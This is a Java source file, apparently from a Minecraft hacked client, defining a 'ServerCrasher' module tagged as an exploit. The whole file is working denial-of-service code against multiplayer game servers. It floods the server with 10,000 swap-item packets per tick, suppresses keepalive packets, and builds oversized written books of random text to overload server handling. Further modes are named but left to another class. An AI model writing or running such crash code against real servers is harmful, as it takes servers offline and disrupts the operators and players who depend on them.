package me.constantindev.ccl.module;

import me.constantindev.ccl.Cornos;
import me.constantindev.ccl.etc.base.Module;
import me.constantindev.ccl.etc.config.MultiOption;
import me.constantindev.ccl.etc.config.Num;
import me.constantindev.ccl.etc.event.EventHelper;
import me.constantindev.ccl.etc.event.EventType;
import me.constantindev.ccl.etc.event.arg.PacketEvent;
import me.constantindev.ccl.etc.helper.ClientHelper;
import me.constantindev.ccl.etc.helper.RandomHelper;
import me.constantindev.ccl.etc.ms.MType;
import me.constantindev.ccl.etc.ms.ServerCrasherManager;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.packet.c2s.play.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

import java.util.Random;

public class ServerCrasher extends Module {
    public ServerCrasher() {
        super("ServerCrasher", "Several ways to crash a server", MType.EXPLOIT);
        this.mconf.add(new MultiOption("mode", "rotation", new String[]{"rotation", "location", "biglocation", "swing", "nprtimeout", "tabcomplete", "pistonheadclick", "blockplace", "blockspam", "bookgivespam"}));
        this.mconf.add(new Num("strength", 100.0, 100, 1));
        Module parent = this;
        EventHelper.BUS.registerEvent(EventType.ONPACKETSEND, eventArg -> {
            if (((PacketEvent) eventArg).packet instanceof KeepAliveC2SPacket) {
                if (parent.mconf.getByName("mode").value.equals("nprtimeout") && parent.isOn.isOn()) {
                    eventArg.cancel();
                    ClientHelper.sendChat("[Crasher:NPRTimeout] Cancelled keepalive packet");
                }
            }
        });
        ServerCrasherManager.runner.start();
    }

    public static ItemStack bigBook() {
        ItemStack is = new ItemStack(Items.WRITABLE_BOOK);
        CompoundTag ct = is.getOrCreateTag();
        ct.putString("author", new Random().nextInt() + "");
        ct.putString("title", new Random().nextInt() + "");
        net.minecraft.nbt.ListTag listTag = new ListTag();
        for (int p = 0; p < 50; p++) {
            listTag.add(StringTag.of(RandomHelper.rndStr(597)));
        }
        ct.put("pages", listTag);
        is.setTag(ct);
        return is;
    }

    @Override
    public void onEnable() {
        ClientHelper.sendChat("Some of the features in the server crasher are a bit outdated and may only work on specific servers, be warned.");
        super.onEnable();
    }

    @Override
    public void onExecute() {
        int strength = (int) ((Num) this.mconf.getByName("strength")).getValue();
        ServerCrasherManager.mode = this.mconf.getByName("mode").value;
        ServerCrasherManager.strength = strength;
        if (ServerCrasherManager.mode.equalsIgnoreCase("swing")) {
            if (Cornos.minecraft.getNetworkHandler() == null) {
                this.isOn.setState(false);
                return;
            }
            try {
                for (int i = 0; i < 10000; i++) {
                    PlayerActionC2SPacket p = new net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN);
                    Cornos.minecraft.getNetworkHandler().sendPacket(p);
                }

            } catch (Exception ignored) {
                this.isOn.setState(false);
            }
        }
        super.onExecute();
    }
}
